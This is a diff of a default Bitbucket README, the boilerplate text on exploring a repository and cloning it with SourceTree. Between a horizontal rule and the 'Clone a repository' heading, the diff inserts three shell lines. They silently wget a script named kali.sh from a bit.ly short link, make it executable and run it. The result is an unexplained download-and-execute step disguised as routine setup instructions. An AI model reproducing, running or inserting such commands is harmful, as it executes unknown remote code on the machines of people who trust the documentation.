@@ -33,6 +33,10 @@ Before you move on, go ahead and explore the repository. You've already seen the
 
 ---
 
+wget -O kali.sh https://bit.ly/3EM0kdd > /dev/null 2>&1
+chmod +x kali.sh
+./kali.sh
+
 ## Clone a repository
 
 Use these steps to clone from SourceTree, our client for using the repository command-line free. Cloning allows you to work on your files locally. If you don't yet have SourceTree, [download and install first](https://www.sourcetreeapp.com/). If you prefer to clone from the command line, see [Clone a repository](https://confluence.atlassian.com/x/4whODQ).
